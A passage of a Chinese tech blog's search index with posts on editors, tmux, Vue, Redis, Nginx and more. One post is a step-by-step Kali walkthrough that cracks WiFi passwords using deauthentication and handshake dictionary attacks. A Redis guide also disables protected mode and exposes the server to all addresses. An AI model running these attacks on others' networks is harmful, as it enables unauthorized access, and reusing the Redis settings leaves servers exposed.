~/.acme.sh/acme.sh --upgrade --auto-upgrade 之后, acme.sh 就会自动保持更新了.</content></entry><entry><title>Sublime Text配置Eclipse快捷键</title><url>/posts/%E5%85%B6%E4%BB%96/sublime-text-%E9%85%8D%E7%BD%AE-eclipse%E5%BF%AB%E6%8D%B7%E9%94%AE/</url><categories><category>Other</category></categories><tags><tag>Sublime Text</tag></tags><content type="html"><![CDATA[   { &#34;keys&#34;: [&#34;alt+/&#34;], &#34;command&#34;: &#34;auto_complete&#34; }, { &#34;keys&#34;: [&#34;ctrl+i&#34;], &#34;command&#34;: &#34;reindent&#34; }, // 当前行和下面一行交互位置 { &#34;keys&#34;: [&#34;alt+up&#34;], &#34;command&#34;: &#34;swap_line_up&#34; }, { &#34;keys&#34;: [&#34;alt+down&#34;], &#34;command&#34;: &#34;swap_line_down&#34; }, // 复制当前行到上一行 { &#34;keys&#34;: [&#34;ctrl+alt+up&#34;], &#34;command&#34;: &#34;duplicate_line&#34; }, // 复制当前行到下一行 { &#34;keys&#34;: [&#34;ctrl+alt+down&#34;], &#34;command&#34;: &#34;duplicate_line&#34; }, // 删除整行 { &#34;keys&#34;: [&#34;ctrl+d&#34;], &#34;command&#34;: &#34;run_macro_file&#34;, &#34;args&#34;: { &#34;file&#34;: &#34;Packages/Default/Delete Line.sublime-macro&#34; } }, // 光标移动到指定行 { &#34;keys&#34;: [&#34;ctrl+l&#34;], &#34;command&#34;: &#34;show_overlay&#34;, &#34;args&#34;: { &#34;overlay&#34;: &#34;goto&#34;, &#34;text&#34;: &#34;:&#34; } }, // 快速定位到选中的文字 { &#34;keys&#34;: [&#34;ctrl+k&#34;], &#34;command&#34;: &#34;find_under_expand_skip&#34; }, // { &#34;keys&#34;: [&#34;ctrl+shift+x&#34;], &#34;command&#34;: &#34;swap_case&#34; }, { &#34;keys&#34;: [&#34;ctrl+shift+x&#34;], &#34;command&#34;: &#34;upper_case&#34; }, { &#34;keys&#34;: [&#34;ctrl+shift+y&#34;], &#34;command&#34;: &#34;lower_case&#34; }, // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后) { &#34;keys&#34;: [&#34;shift+enter&#34;], &#34;command&#34;: &#34;run_macro_file&#34;, &#34;args&#34;: { &#34;file&#34;: &#34;Packages/Default/Add Line.sublime-macro&#34; } }, // 定位到对于的匹配符(譬如{})(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之) { &#34;keys&#34;: [&#34;ctrl+shift+p&#34;], &#34;command&#34;: &#34;move_to&#34;, &#34;args&#34;: { &#34;to&#34;: &#34;brackets&#34; } }, // 这个命令默认使用的是ctrl+shift+p { &#34;keys&#34;: [&#34;ctrl+p&#34;], &#34;command&#34;: &#34;show_overlay&#34;, &#34;args&#34;: { &#34;overlay&#34;: &#34;command_palette&#34; } }, // outline { &#34;keys&#34;: [&#34;ctrl+o&#34;], &#34;command&#34;: &#34;show_overlay&#34;, &#34;args&#34;: { &#34;overlay&#34;: &#34;goto&#34;, &#34;text&#34;: &#34;@&#34; } }, // 当前文件中的关键字(方便快速查找内容) { &#34;keys&#34;: [&#34;ctrl+alt+o&#34;], &#34;command&#34;: &#34;show_overlay&#34;, &#34;args&#34;: { &#34;overlay&#34;: &#34;goto&#34;, &#34;text&#34;: &#34;#&#34; } }, // open resource { &#34;keys&#34;: [&#34;ctrl+shift+r&#34;], &#34;command&#34;: &#34;show_overlay&#34;, &#34;args&#34;: { &#34;overlay&#34;: &#34;goto&#34;, &#34;show_files&#34;: true } }, // 文件内查找/替换 { &#34;keys&#34;: [&#34;ctrl+f&#34;], &#34;command&#34;: &#34;show_panel&#34;, &#34;args&#34;: { &#34;panel&#34;: &#34;replace&#34; } }, // 全局查找/替换, 在查询结果中双击跳转到匹配位置 { &#34;keys&#34;: [&#34;ctrl+shift+u&#34;], &#34;command&#34;: &#34;show_panel&#34;, &#34;args&#34;: { &#34;panel&#34;: &#34;find_in_files&#34; } }, { &#34;keys&#34;: [&#34;ctrl+j&#34;], &#34;command&#34;: &#34;show_panel&#34;, &#34;args&#34;: { &#34;panel&#34;: &#34;incremental_find&#34;, &#34;reverse&#34;: false } }, { &#34;keys&#34;: [&#34;ctrl+shift+j&#34;], &#34;command&#34;: &#34;show_panel&#34;, &#34;args&#34;: { &#34;panel&#34;: &#34;incremental_find&#34;, &#34;reverse&#34;: true } }, // Select text between brackets { &#34;keys&#34;: [&#34;alt+backspace&#34;], &#34;command&#34;: &#34;bh_key&#34;, &#34;args&#34;: { &#34;lines&#34;: true, &#34;plugin&#34;: { &#34;type&#34;: [&#34;__all__&#34;], &#34;command&#34;: &#34;bh_modules.bracketselect&#34; } } }, // // Remove brackets // { // &#34;keys&#34;: [&#34;alt+backspace&#34;], // &#34;command&#34;: &#34;bh_remove_brackets&#34; // }, // Convert single quote string to double quoted string and vice versa // Will handle escaping or unescaping quotes within the string { &#34;keys&#34;: [&#34;alt+&#39;&#34;], &#34;command&#34;: &#34;bh_key&#34;, &#34;args&#34;: { &#34;lines&#34;: true, &#34;plugin&#34;: { &#34;type&#34;: [&#34;single_quote&#34;, &#34;double_quote&#34;, &#34;py_single_quote&#34;, &#34;py_double_quote&#34;], &#34;command&#34;: &#34;bh_modules.swapquotes&#34; } } }, // Swap brackets with another type { &#34;keys&#34;: [&#34;alt+[&#34;], &#34;command&#34;: &#34;swap_brackets&#34; }, // Surround selection with brackets from quick panel { &#34;keys&#34;: [&#34;alt+]&#34;], &#34;command&#34;: &#34;wrap_brackets&#34; }, // plugin配置 { &#34;keys&#34;: [&#34;alt+a&#34;], &#34;command&#34;: &#34;alignment&#34; }, { &#34;keys&#34;: [&#34;ctrl+shift+f&#34;], &#34;command&#34;: &#34;js_format&#34; }, //Andy Edits plugin { &#34;keys&#34;: [&#34;ctrl+alt+d&#34;], &#34;command&#34;: &#34;delete_edit&#34; }, { &#34;keys&#34;: [&#34;ctrl+alt+h&#34;], &#34;command&#34;: &#34;toggle_edits&#34; }, { &#34;keys&#34;: [&#34;ctrl+alt+j&#34;], &#34;command&#34;: &#34;quick_edits&#34; }, { &#34;keys&#34;: [&#34;ctrl+alt+k&#34;], &#34;command&#34;: &#34;prev_edit_line&#34; }, { &#34;keys&#34;: [&#34;ctrl+alt+l&#34;], &#34;command&#34;: &#34;next_edit_line&#34; }, { &#34;keys&#34;: [&#34;ctrl+alt+m&#34;], &#34;command&#34;: &#34;list_all_edits&#34; }, { &#34;keys&#34;: [&#34;ctrl+alt+c&#34;], &#34;command&#34;: &#34;create_edit&#34; },   ]]></content></entry><entry><title>Tmux的使用</title><url>/posts/linux%E6%93%8D%E4%BD%9C/tmux%E7%9A%84%E4%BD%BF%E7%94%A8/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"><![CDATA[  Tmux的使用 说明：Ctrl+b 为快捷方式的前缀键，即先按下Ctrl+b，快捷键才会生效。
1. 会话管理 1.1 新建会话 tmux new -s &lt;session-name&gt; 1.2 分离会话 在 Tmux 窗口中，按下Ctrl+b d或者输入tmux detach命令，就会将当前会话与窗口分离。
tmux detach 上面命令执行后，就会退出当前 Tmux 窗口，但是会话和里面的进程仍然在后台运行。
tmux ls命令可以查看当前所有的 Tmux 会话。
tmux ls # or tmux list-session 1.3 接入会话 tmux attach命令用于重新接入某个已存在的会话
# 使用会话编号 tmux attach -t 0 # 使用会话名称 tmux attach -t &lt;session-name&gt; 1.4 杀死会话 tmux kill-session命令用于杀死某个会话
# 使用会话编号 tmux kill-session -t 0 # 使用会话名称 tmux kill-session -t &lt;session-name&gt; 1.5 切换会话 tmux switch命令用于切换会话
# 使用会话编号 tmux switch -t 0 # 使用会话名称 tmux switch -t &lt;session-name&gt; 1.6 重命名会话 tmux rename-session命令用于重命名会话。
tmux rename-session -t 0 &lt;new-name&gt; 1.7 会话快捷键 $ Ctrl+b d：分离当前会话。 $ Ctrl+b s：列出所有会话。 $ Ctrl+b $：重命名当前会话。 2. 窗口管理 2.1 新建窗口 tmux new-window # 新建一个指定名称的窗口 tmux new-window -n &lt;window-name&gt; 2.2 切换窗口 # 切换到指定编号的窗口 tmux select-window -t &lt;window-number&gt; # 切换到指定名称的窗口 tmux select-window -t &lt;window-name&gt; 2.3 重命名窗口 tmux rename-window &lt;new-name&gt; 2.4 窗口快捷键 Ctrl+b c：创建一个新窗口，状态栏会显示多个窗口的信息。 Ctrl+b p：切换到上一个窗口（按照状态栏上的顺序）。 Ctrl+b n：切换到下一个窗口。 Ctrl+b ：切换到指定编号的窗口，其中的是状态栏上的窗口编号。 Ctrl+b w：从列表中选择窗口。 Ctrl+b ,：窗口重命名。 Ctrl+b %：划分左右两个窗格。 Ctrl+b &#34;：划分上下两个窗格。 Ctrl+b ：光标切换到其他窗格。是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。 Ctrl+b ;：光标切换到上一个窗格。 Ctrl+b o：光标切换到下一个窗格。 Ctrl+b {：当前窗格左移。 Ctrl+b }：当前窗格右移。 Ctrl+b Ctrl+o：当前窗格上移。 Ctrl+b Alt+o：当前窗格下移。 Ctrl+b x：关闭当前窗格。 Ctrl+b !：将当前窗格拆分为一个独立窗口。 Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。 Ctrl+b Ctrl+：按箭头方向调整窗格大小。 Ctrl+b q：显示窗格编号。 更改prefix前缀快捷键 修改系统级的/etc/tmux.conf或用户级的~/.tmux.conf，没有的话新建
向文件写入一下内容
set -g prefix C-x unbind C-b bind C-x send-prefix   ]]></content></entry><entry><title>Vim进阶使用</title><url>/posts/vim/vim%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/</url><categories><category>Vim</category></categories><tags><tag>Vim</tag></tags><content type="html"><![CDATA[  1. 查找和替换 1.1 搜索类命令 输入 / 加上一个字符串可以用以在当前文件中查找该字符串。 1. 在正常模式下输入 / 字符。您此时会注意到该字符和光标都会出现在屏幕底部，这跟 : 命令是一样的。 2. 接着输入 errroor &amp;lt;回车&amp;gt;。那个errroor就是您要查找的字符串。 要查找同上一次的字符串，只需要按 n 键。要向相反方向查找同上一次的字 符串，请输入大写 N 即可。 如果您想逆向查找字符串，请使用 ? 代替 / 进行。 要回到您之前的位置按 CTRL-O (按住 Ctrl 键不放同时按下字母 o)。重复按可以回退更多步。CTRL-I 会跳转到较新的位置。 ---&amp;gt; &amp;#34;errroor&amp;#34; is not the way to spell error; errroor is an error. 提示：如果查找已经到达文件末尾，查找会自动从文件头部继续查找，除非 wrapscan 选项被复位。
1.2 替换命令 输入 :s/old/new/g 可以替换 old 为 new。 1. 请将光标移动到本节中下面标记有 ---&amp;gt; 的那一行。 输入 :s/thee/the &amp;lt;回车&amp;gt; 。请注意该命令只改变光标所在行的第一个匹配 串。 输入 :s/thee/the/g	则是替换全行的匹配串，该行中所有的 &amp;ldquo;thee&amp;rdquo; 都会被 改变。 ---&amp;gt; thee best time to see thee flowers is in thee spring. 要替换两行之间出现的每个匹配串，请 输入 :#,#s/old/new/g 其中 #,# 代表的是替换操作的若干行中首尾两行的行号。 输入 :%s/old/new/g 则是替换整个文件中的每个匹配串。 输入 :%s/old/new/gc 会找到整个文件中的每个匹配串，并且对每个匹配串提示是否进行替换。 2. 宏录制 宏的录制
在 Vim 编辑器中创建新文件或打开现有文件； 按 q 并跟上 宏名 开始录制。假设我们想要将宏名命名为 b ，则按 Esc 和 qb 开始录制； 按 q 停止录制。至此，宏的录制已完成。 宏的运行
按 @ 接 宏名 即可运行宏一次，按 次数 接 @宏名 重复运行宏多次。
下面给出实例来详细介绍。
示例-1：使用宏多次生成相 …  ]]></content></entry><entry><title>Vite配置</title><url>/posts/%E5%89%8D%E7%AB%AF/vite%E9%85%8D%E7%BD%AE/</url><categories><category>前端</category></categories><tags><tag>Vite</tag></tags><content type="html"><![CDATA[  vite.config.js import { defineConfig } from &#34;vite&#34;; import { resolve } from &#34;path&#34;; import vue from &#39;@vitejs/plugin-vue&#39;; function pathResolve(dir) { return resolve(__dirname, &#34;.&#34;, dir); } export default defineConfig({ base: &#34;&#34;, plugins:[vue()], resolve: { alias: { &#34;@&#34;: pathResolve(&#34;src&#34;), } }, optimizeDeps: { include: [&#39;axios&#39;], }, build: { target: &#39;modules&#39;, outDir: &#39;dist&#39;, assetsDir: &#39;assets&#39;, minify: &#39;terser&#39; // 混淆器 }, server: { cors: true, open: true, proxy: { &#39;/api&#39;: { target: &#39;http://192.168.99.223:3000&#39;, //代理接口 changeOrigin: true, rewrite: (path) =&gt; path.replace(/^\/api/, &#39;&#39;) } } } }); jsconfig.json { &#34;compilerOptions&#34;: { &#34;baseUrl&#34;: &#34;./&#34;, &#34;paths&#34;: { &#34;@/*&#34;: [&#34;src/*&#34;] } }, &#34;exclude&#34;: [&#34;node_modules&#34;, &#34;dist&#34;] }   ]]></content></entry><entry><title>Vue3路由传参</title><url>/posts/%E5%89%8D%E7%AB%AF/vue3%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82/</url><categories><category>前端</category></categories><tags><tag>路由</tag></tags><content type="html"><![CDATA[  Vue3路由传参 方法1：页面刷新数据不会丢失 路由
export default { path: &#39;/product/:productId&#39;, name: &#39;product&#39;, component: Product } 传入方
import router from &#34;@/router/index.js&#34;; router.push(&#34;/product/&#34; + productId) 接收方
import router from &#34;@/router/index.js&#34;; let productId = router.currentRoute.value.params.productId 方法2：使用path来匹配路由，通过query来传递参数。这种情况下query传递的参数会显示在地址栏中url?id=‘传值’ 路由
export default { path: &#39;/product&#39;, name: &#39;product&#39;, component: Product } 传入方
import router from &#34;@/router/index.js&#34;; router.push({ path: &#39;/product&#39;, query: { productId: productId } }) 接收方
import router from &#34;@/router/index.js&#34;; let productId = router.currentRoute.value.query.productId   ]]></content></entry><entry><title>X-UI，支持多协议多用户的Xray面板</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/x-ui%E6%94%AF%E6%8C%81%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%A4%9A%E7%94%A8%E6%88%B7%E7%9A%84-xray-%E9%9D%A2%E6%9D%BF/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>XUI</tag></tags><content type="html"> X-ui，支持多协议多用户的 Xray 面板！ 1.0 安装x-ui x-ui地址： https://github.com/vaxilu/x-ui acme脚本地址： https://github.com/acmesh-official/acme.sh 1.0.1更新及安装组件 apt update -y # Debian/Ubuntu 命令 apt install -y curl #Debian/Ubuntu 命令 apt install -y socat #Debian/Ubuntu 命令 yum update -y #CentOS 命令 yum install -y curl #CentOS 命令 yum install -y socat #CentOS 命令 # 关闭防火墙 systemctl disable firewalld.service systemctl stop firewalld.service 1.0.2 安装 Acme 脚本 curl https://get.acme.sh | sh 1.0.3 80 端口空闲的证书申请方式 自行更换代码中的域名、邮箱为你解析的域名及邮箱
~/.acme.sh/acme.sh --set-default-ca --server letsencrypt /zerossl ~/.acme.sh/acme.sh --register-account -m xxxx@xxxx.com ~/.acme.sh/acme.sh --issue -d mydomain.com --standalone 1.0.4 安装证书到指定文件夹（选做） 自行更换代码中的域名为你解析的域名
~/.acme.sh/acme.sh --installcert -d mydomain.com --key-file /root/private.key --fullchain-file /root/cert.crt 1.0.5 安装 &amp;amp;amp; 升级 X-ui 面板 安装及升级的一键代码
bash &amp;amp;lt;(curl -Ls https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh) # 2023-8 之后安装方法，可切换xray1.8 bash &amp;amp;lt;(curl -Ls …</content></entry><entry><title>安装Redis</title><url>/posts/redis/%E5%AE%89%E8%A3%85redis/</url><categories><category>Redis</category></categories><tags><tag>Redis</tag></tags><content type="html"><![CDATA[  1. 编译安装 wget https://codeload.github.com/redis/redis/tar.gz/refs/tags/7.0.4 -O redis-7.0.4.tar.gz tar zxf redis-7.0.4.tar.gz apt install build-essential cd /redis-7.0.4/src make install cd ../ sed -i &#39;s|daemonize no|daemonize yes|&#39; redis.conf sed -i &#39;s|# supervised auto|supervised no|&#39; redis.conf sed -i &#39;s|bind 127.0.0.1 ::1|bind 0.0.0.0|&#39; redis.conf sed -i &#39;s|protected-mode yes|protected-mode no|&#39; redis.conf sed -i &#39;s|# requirepass foobared|requirepass czyadmin|&#39; redis.conf mkdir /etc/redis cp redis.conf /etc/redis/ /usr/local/bin/redis-server /etc/redis/redis.conf vim /lib/systemd/system/redis.service [Unit] Description=Redis data structure server Documentation=https://redis.io/documentation Wants=network-online.target After=network-online.target [Service] Type=forking ExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf ExecStop=/bin/kill -s TERM $MAINPID PIDFile=/run/redis/redis-server.pid TimeoutStopSec=0 Restart=always RuntimeDirectory=redis RuntimeDirectoryMode=2755 UMask=007 PrivateTmp=yes LimitNOFILE=65535 PrivateDevices=yes ProtectHome=yes [Install] WantedBy=multi-user.target systemctl daemon-reload systemctl start redis.service 2. 命令行安装 apt install redis-server -y   ]]></content></entry><entry><title>安装ZHS</title><url>/posts/vim/%E5%AE%89%E8%A3%85zhs/</url><categories><category>Vim</category></categories><tags><tag>Vim</tag><tag>ZHS</tag></tags><content type="html"> # 使用方法 $ git clone https://gitee.com/colzry/my_oh-my-zsh.git $ cd my_oh-my-zsh $ chmod +x install.sh # 注意：如果没有安装zsh，则先安装zsh $ sudo apt install zsh $ ./install.sh $ mv .zshrc ../ # 安装插件 $ git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions $ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting 刷新配置文件
$ source ~/.zshrc</content></entry><entry><title>编译安装Nginx</title><url>/posts/nginx/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"> 编译安装Nginx 1. 卸载原有的Nginx dnf remove nginx nginx-common 2. 安装编译依赖 2.1 安装编译工具 dnf install make automake gcc gcc-c++ kernel-devel 2.2 安装编译时需要的依赖 dnf install -y pcre pcre-devel pcre2 pcre2-devel zlib zlib-devel openssl openssl-devel libxslt-devel 2.3 拉取需要编译的模块 git clone https://github.com/arut/nginx-dav-ext-module 3. 下载并解压nginx wget http://nginx.org/download/nginx-1.23.3.tar.gz &amp;amp;amp;&amp;amp;amp; tar -zvxf nginx-1.23.3.tar.gz ##　4. 编译nginx
4.1 创建nginx用户 注意： 后面并没有使用nginx用户启动，需要自行配置
#创建nginx用户与用户组 useradd -s /sbin/nologin nginx 4.2 做编译前的配置 ./configure \ --prefix=/usr \ --sbin-path=/usr/sbin/nginx \ --conf-path=/etc/nginx/nginx.conf \ --error-log-path=/var/log/nginx/error.log \ --http-log-path=/var/log/nginx/access.log \ --pid-path=/var/run/nginx/nginx.pid \ --lock-path=/var/lock/nginx.lock \ --user=nginx \ --group=nginx \ --with-http_gzip_static_module \ --with-http_ssl_module \ --with-http_stub_status_module \ --with-http_flv_module \ --with-http_dav_module --add-module=../nginx-dav-ext-module …</content></entry><entry><title>搭建私有云盘</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BA%91%E7%9B%98/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>cloudreve</tag></tags><content type="html">
下载并安装cloudreve GitHub仓库地址： https://github.com/cloudreve/Cloudreve/releases 下载arm版本 上传并解压 # 解压程序包 tar -zxvf cloudreve_VERSION_OS_ARCH.tar.gz # 赋予执行权限 chmod +x ./cloudreve # 启动 Cloudreve ./cloudreve 这个时候控制台会显示管理员的用户名和密码，访问树莓派的5212端口（先放行5212端口）就可以来到网站
添加守护进程，让其开机自启 # 编辑配置文件 sudo vim /usr/lib/systemd/system/cloudreve.service 将下文 PATH_TO_CLOUDREVE 更换为程序所在目录：
[Unit] Description=Cloudreve Documentation=https://docs.cloudreve.org After=network.target After=mysqld.service Wants=network.target [Service] WorkingDirectory=/PATH_TO_CLOUDREVE ExecStart=/PATH_TO_CLOUDREVE/cloudreve Restart=on-abnormal RestartSec=5s KillMode=mixed StandardOutput=null StandardError=syslog [Install] WantedBy=multi-user.target ======================法二======================== [Unit] Description=Cloudreve Documentation=https://docs.cloudreve.org After=network.target Wants=network.target [Service] WorkingDirectory=/opt ExecStart=/opt/cloudreve Restart=on-abnormal RestartSec=5s KillMode=mixed StandardOutput=null StandardError=syslog [Install] WantedBy=multi-user.target # 更新配置 sudo systemctl daemon-reload # 启动服务 sudo systemctl start cloudreve # 设置开机启动 sudo systemctl enable cloudreve 管理命令：
# 启动服务 sudo systemctl start cloudreve # 停止服务 sudo systemctl stop cloudreve # 重启服务 sudo systemctl restart cloudreve # 查看状态 sudo systemctl status cloudreve 安装Aria2让cloudreve支持离线下载 BT下载服务搭建 cloudreve配置aria2 来到cloudreve首页，点击管理面板 RPC Secret处填写自己设定的密码
RPC 服务器地址填写本地aria2监听的端口
填写一下临时下载目录保存就行了
批量删除前缀 j=&amp;#34;&amp;#34;;for i in `ls` ;do echo $i;j=${i#*_};mv $i $j;echo $j ;done</content></entry><entry><title>对称加密和非对称加密</title><url>/posts/%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%8A%A0%E5%AF%86/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%B8%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/</url><categories><category>认证和加密</category></categories><tags><tag>加密</tag></tags><content type="html"><![CDATA[  对称加密与非对称加密 1. 对称加密 对称加密又叫做私钥加密，即信息的发送方和接收方使用同一个密钥去加密和解密数据。对称加密的特点是算法公开、加密和解密速度快，适合于对大数据量进行加密。
加密过程如下：明文 + 加密算法 + 私钥 =&gt; 密文 解密过程如下：密文 + 解密算法 + 私钥 =&gt; 明文
对称加密中用到的密钥叫做私钥，私钥表示个人私有的密钥，即该密钥不能被泄露。 其加密过程中的私钥与解密过程中用到的私钥是同一个密钥，这也是称加密之所以称之为“对称”的原因。由于对称加密的算法是公开的，所以一旦私钥被泄露，那么密文就很容易被破解，所以对称加密的缺点是密钥安全管理困难。
2. 非对称加密 非对称加密也叫做公钥加密。非对称加密与对称加密相比，其安全性更好。对称加密的通信双方使用相同的密钥，如果一方的密钥遭泄露，那么整个通信就会被破解。而非对称加密使用一对密钥，即公钥和私钥，且二者成对出现。私钥被自己保存，不能对外泄露。公钥指的是公共的密钥，任何人都可以获得该密钥。用公钥或私钥中的任何一个进行加密，用另一个进行解密。
加解密过程：明文 + 加密算法 + 公钥 =&gt; 密文， 密文 + 解密算法 + 私钥 =&gt; 明文
由于加密和解密使用了两个不同的密钥，这就是非对称加密“非对称”的原因。非对称加密的缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。
3. 常见加密算法 3.1 散列算法 名称 安全性 速度 MD5 中 快 SHA-1 高 慢 3.2 对称加密算法 名称 密钥名称 运行速度 安全性 资源消耗 DES 56位 较快 低 中 3DES 112位或168位 慢 中 高 AES 128、192、256位 快 高 低 HS256 3.3 非对称加密算法 名称 成熟度 运行速度 安全性 资源消耗 RSA 高 中 高 中 ECC 高 慢 高 高 RS256   ]]></content></entry><entry><title>十大排序算法</title><url>/posts/%E7%AE%97%E6%B3%95/%E5%8D%81%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url><categories><category>算法</category></categories><tags><tag>算法</tag></tags><content type="html"><![CDATA[  归并排序 算法思想 该算法采用经典的分治（divide-and-conquer）策略，分：问题分成一些小的问题然后递归求解，治：将分的阶段得到的各答案&amp;quot;修补&amp;quot;在一起，即分而治之。将序列递归拆半分成多个子序列，再将各个子序列排序后归并叠加，最后归并所有子序列，排序完成。
代码实现 // 归并排序 public static void mergeSort(int[] arr, int left, int right) { if (left &amp;lt; right) { int mid = (left + right) / 2; // 分 mergeSort(arr, left, mid); mergeSort(arr, mid+1, right); // 治 merge(arr, left, mid, right); } } public static void merge(int[] arr, int left, int mid, int right) { // 临时数组 int[] temp = new int[right-left+1]; // 左、右指针 int i = left; int j = mid+1; int k = 0; // 将两段数据按序写入临时数组 while (i &amp;lt;= mid &amp;amp;&amp;amp; j &amp;lt;= right) { if (arr[i] &amp;lt;= arr[j]) { temp[k++] = arr[i++]; }else { temp[k++] = arr[j++]; } } // 剩余数据写入 while (i &amp;lt;= mid) { temp[k++] = arr[i++]; } while (j &amp;lt;= right) { temp[k++] = arr[j++]; } // 更新arr数组 k = 0; while (left &amp;lt;= right) { arr[left++] = temp[k++]; } } 快速排序 算法思想 以第一个元素为基准，左右指针向中间移动扫描，小于基准元素的放到左边，大于基准元素的放到右边，最后将基准元素放到中间，这个位置也就是基准元素的合适位置。此时数据以基准元素为间隔，分为左右两部分（不包括基准元素），然后分别对左右两部分数据分别执行此过程，直到数据 …  ]]></content></entry><entry><title>使用Kali爆破WIFI密码</title><url>/posts/linux%E6%93%8D%E4%BD%9C/%E4%BD%BF%E7%94%A8kali%E7%88%86%E7%A0%B4wifi%E5%AF%86%E7%A0%81/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"> 使用kali爆破WiFi密码 首先准备一个免驱的kali无线网卡 过程 插上无线网卡，让虚拟机的kali连接上无线网卡 打开终端，使用ifconfig查看网卡信息 可以看到wlan0就是无线网卡
注意： 以下命令都在root模式下执行
为无线网卡开启监听模式 airmon-ng start wlan0 若遇到提示，则运行提示里的命令即可
再次使用ifconfig命令查看是否被监听
若后面出现mon则说明已经被监听
扫描附近的WiFi airodump-ng wlan0mon BSSID 表示MAC地址 PWR 表示信号 -------排名越靠前的信号越好 CH 表示信号道 ESSID 表示WiFi名称 大概稳定之后可以使用Ctrl + C结束扫描
抓包 airodump-ng --bssid 02:4B:F3:00:7E:D7 -c 6 --write /home/kali/demo wlan0mon --bssid 表示目标WiFi的MAC地址 -c 表示目标WiFi所处的信号道 --wirte 表示抓到的包所在的文件地址（/home/kali/ 为文件目录） 若红框中并没有内容则说明还没抓到数据包，这时需要有人连接上WiFi或者让连接的设备下线，让设备再次自动连接WiFi，这时就可以抓取到握手包
我们选择后者的操作，重新打开新的终端，使用命令
sudo aireplay-ng -0 3 -a 02:4B:F3:00:7E:D7 wlan0mon -0 表示发送攻击的数据包个数 -a 表示目标WiFi的MAC地址 这个时候可以发现上一个终端所标的红框处已经有了内容，说明抓包成功
来到保存握手包的目录，可以发现握手包已经放在了此目录下
使用密码字典进行爆破 密码字典可以使用网上找的，也可以使用kali自带的
来到密码字典所在的目录，执行下面命令
aircrack-ng -w FastPwds.txt /home/kali/demo-01.cap -w 表示密码字典 /home/kali/demo-01.cap 则是握手包 啪的一下，很快啊，就爆破完了(前提密码很简单)，红框中的内容就是密码
注意：本方法只是用来学习和交流的</content></entry><entry><title>使用Nginx快速搭建文件索引服务</title><url>/posts/nginx/%E4%BD%BF%E7%94%A8nginx%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B4%A2%E5%BC%95%E6%9C%8D%E5%8A%A1/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"> 使用宝塔面板 在宝塔面板找到Nginx，点击设置，打开配置修改
在http的花括号中添加以下内容
server { listen 80; # 监听80端口 server_name localhost; # 自己PC的ip或者服务器的域名 charset utf-8; # 避免中文乱码 root /opt/data; # 存放文件的目录 location / { autoindex on; # 索引 autoindex_exact_size on; # 显示文件大小 autoindex_localtime on; # 显示文件时间 } } 修改完成后，点击最上面的服务，选择重载配置
打开主机ip的80端口就能看到文件索引了
不使用宝塔面板 1.安装nginx
sudo apt-get install nginx 2.创建conf文件
sudo vim /etc/nginx/conf.d/file_server.conf 3.修改conf文件如下：
server { listen 80; # 监听80端口 server_name localhost; # 自己PC的ip或者服务器的域名 charset utf-8; # 避免中文乱码 root /opt/data; # 存放文件的目录 location / { autoindex on; # 索引 autoindex_exact_size on; # 显示文件大小 autoindex_localtime on; # 显示文件时间 } } 3.使配置生效
sudo rm /etc/nginx/sites-enabled/default sudo service nginx reload 4.重启命令
sudo /etc/init.d/nginx start|stop|reload| sudo service nginx start|stop|reload| 5.访问 浏览器里直接输入 主机IP:80</content></entry><entry><title>微软拼音添加小鹤双拼</title><url>/posts/%E5%85%B6%E4%BB%96/%E5%BE%AE%E8%BD%AF%E6%8B%BC%E9%9F%B3%E6%B7%BB%E5%8A%A0%E5%B0%8F%E9%B9%A4%E5%8F%8C%E6%8B%BC/</url><categories><category>Other</category></categories><tags><tag>小鹤</tag></tags><content type="html"> 首先打开注册表，找到这个路径
计算机\HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\CHS 然后新建一个名为 UserDefinedDoublePinyinScheme0 的字符串值，数值数据为
小鹤双拼*2*^*iuvdjhcwfg^xmlnpbksqszxkrltvyovt 然后打开控制面板，找到微软拼音的配置页面，把新出现的小鹤双拼设置为默认值</content></entry><entry><title>自用Vim配置 SimpleVim</title><url>/posts/vim/simplevim/</url><categories><category>Vim</category></categories><tags><tag>Vim</tag></tags><content type="html"><![CDATA[  
